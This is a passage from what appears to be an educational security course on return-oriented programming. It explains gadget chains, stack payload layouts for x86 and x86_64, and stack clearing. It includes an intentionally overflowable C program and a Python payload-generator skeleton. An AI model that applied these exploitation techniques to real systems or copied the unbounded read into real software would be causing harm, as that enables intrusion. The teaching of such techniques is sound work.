Say you need to call <code>f1()</code> and then <code>f2(0xAB, 0xCD)</code>? The payload should be:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of f1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   addr of f2 (return address after f1 finishes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   JUNK (return address after f2 finishes: we don&#x27;t care about what happens after the 2 functions are called)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xAB (param1 of f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   0xCD (param2 of f2)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>What about if we need to call <code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>?</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of f1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   addr of f2 (return address after f1 finishes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0xAB (param1 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   0x42 (param2 of f2)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nop-analogy">NOP Analogy<a class="hash-link" href="#nop-analogy" title="Direct link to heading">​</a></h3><p>While <code>ret2libc</code> uses functions directly, <code>ROP</code> uses a finer level of code execution: instruction groups.
Let&#x27;s explore an example:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This code obviously suffers from a stack buffer overflow.
The offset to the return address is 24.
So <code>DOWRD</code>s from offset 24 onward will be popped from the stack and executed.
Remember the <code>NOP</code> sled concept from previous sessions?
These were long chains of <code>NOP</code> instructions (<code>\x90</code>) used to pad a payload for alignment purposes.
Since we can&#x27;t add any new code to the program (<code>NX</code> is enabled) how could we simulate the effect of a <code>NOP</code> sled?
Easy!
Using return instructions!</p><p>Let&#x27;s find the <code>ret</code> instructions in a would-be binary:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump  -d hello -M intel | grep $&#x27;\t&#x27;ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80482dd:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 804837a:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80483b7:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048437:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 8048444:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80484a9:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80484ad:   c3                      ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 80484c6:   c3                      ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Any and all of these addresses will be OK.
The payload could be the following:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   0x80482dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   0x80482dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0x80482dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0x80482dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   0x80482dd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The above payload will run like so: the original <code>ret</code> (in the normal code flow) will pop <code>RET+0x00</code> off the stack and jump to it.
When <code>RET+0x00</code> gets popped, the stack is automatically increased by 4 (on to the next value).
The instruction at <code>0x80482dd</code> is another <code>ret</code>, which does the same thing as before.
This goes on until another address that is not a <code>ret</code> is popped off the stack.</p><p>In general, you can use the skeleton below to generate payloads:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#! /usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> struct</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dw</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> struct</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&lt;I&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#TODO update count for your prog</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pad_count_to_ret </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;X&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> pad_count_to_ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#TODO figure out the rop chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> dw</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xcafebeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> dw</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadc0de</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;ascii&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;replace&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="gadgets-and-rop-chains">Gadgets and <code>ROP</code> Chains<a class="hash-link" href="#gadgets-and-rop-chains" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="code-execution">Code Execution<a class="hash-link" href="#code-execution" title="Direct link to heading">​</a></h3><p>Now that we&#x27;ve understood the basics of Return Oriented Programming, let&#x27;s actually do something useful.
The building blocks of <code>ROP</code> payloads are called <strong>gadgets</strong>.
These are blocks of instructions that end with a <code>ret</code> instruction.
Here are some <em>gadgets</em> from the previous program:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0x8048443: pop ebp; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x80484a7: pop edi; pop ebp; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x8048441: mov ebp,esp; pop ebp; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x80482da: pop eax; pop ebx; leave; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x80484c3: pop ecx; pop ebx; leave; ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>By carefully placing addresses to such gadgets on the stack we can bring code execution to almost any context we want.
As an example, let&#x27;s say we would like to load <code>0x41424344</code> into <code>eax</code> and <code>0x61626364</code> into <code>ebx</code>.
The payload should look like this:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   0x80482da  (pop eax; pop ebx; leave; ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   0x41424344</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0x61626364</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xAABBCCDD (instruction were the gadget&#x27;s ret will jump to)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see what exactly happens when this payload is given to our binary:</p><ul><li>First the return address is popped from the stack and execution goes there.</li><li>At <code>pop eax</code>, <code>0x41424344</code> is loaded into <code>eax</code> and the stack is increased.</li><li>At <code>pop ebx</code>, <code>0x61626364</code> is loaded into <code>ebx</code> and the stack is increased again.</li><li>At <code>leave</code>, two things actually happen: <code>mov esp, ebp; pop ebp</code>.
So the stack frame is decreased to the previous one (pointed by <code>ebp</code>) and <code>ebp</code> is updated to the one before that.
So <code>esp</code> will now be the old <code>ebp + 4</code>.</li><li>At <code>ret</code>, the code flow will go to the instruction pointed to by <code>ebp+4</code>.
This implies that execution will not go to <code>0xAABBCCDD</code> but to some other address that may or may not be in our control (depending on how much we can overflow on the stack).
If it is in our control we can overwrite that address with the rest of the <code>ROP</code> chain.</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="changing-register-values">Changing Register Values<a class="hash-link" href="#changing-register-values" title="Direct link to heading">​</a></h3><p>We have now seen how gadgets can be useful if we want the CPU to achieve a certain state.
This is particularly useful on other architectures such as ARM and x86_64 where functions do not take parameters from the stack but from registers.
As an example, if we want to call <code>f1(0xAB, 0xCD, 0xEF)</code> on x86_64 we first need to know the calling convention for the first three parameters (the convention for placing the rest of the parameters can be found in <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions" target="_blank" rel="noopener noreferrer">table here</a>):</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1st param: RDI</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2nd param: RSI</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3rd param: RDX</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we need to find gadgets for each of these parameters.
Let&#x27;s assume these 2 scenarios:</p><p><strong>Scenario 1:</strong></p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0x400124:  pop rdi; pop rsi; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x400235:  pop rdx; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x400440:  f1()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   0x400124</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   val of RDI (0xAB)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   val of RSI (0xCD)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x18:   0x400235</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x20:   val of RDX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x28:   f1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Scenario 2:</strong></p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0x400125:  pop rdi; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x400252:  pop rsi; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x400235:  pop rdx; ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x400440:  f1()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   0x400125</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   val of RDI (0xAB)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   0x400252</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x18:   val of RSI (0xCD)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x20:   0x400235</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x28:   val of RDX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x30:   f1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Notice that because the architecture is 64 bits wide, the values on the stack are not double words but quad words (quad words: 8 bytes wide).
Thus, the offsets between the values in the payload are 8, instead of 4 (as they would be on a 32-bit architecture).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="clearing-the-stack">Clearing the Stack<a class="hash-link" href="#clearing-the-stack" title="Direct link to heading">​</a></h3><p>The second use of gadgets is to clear the stack.
Remember the issue we had in the <a href="#motivation">Motivation</a> section?
Let&#x27;s solve it using gadgets.
We need to call <code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>.
Our initial solution was:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of f1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   addr of f2 (return address after f1 finishes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0xAB (param1 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xCD (param2 of f1)  but this should also be 0xEF (param1 of f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   0x42 (param2 of f2)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Note that now, for the sake of clarity, we&#x27;re moving back to <code>x32</code>, so that parameters are again passed on the stack.</p><p>The problem is that those parameters of <code>f1</code> are getting in the way of calling <code>f2</code>.
We need to find a <code>pop pop ret</code> gadget.
The actual registers are not important, as we only need to clear 2 values from the stack.</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of f1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   addr of (pop eax, pop ebx, ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0xAB (param1 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xCD (param2 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   addr of f2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x14:   JUNK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x18:   0xEF (param1 of f2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x1c:   0x42 (param2 of f2)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we can even call the next function <code>f3</code> if we repeat the trick:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x00:   addr of f1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x04:   addr of (pop eax, pop ebx, ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x08:   0xAB (param1 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x0c:   0xCD (param2 of f1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x10:   addr of f2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x14:   addr of (pop eax, pop ebx, ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RET + 0x18:   0xEF (param1 of 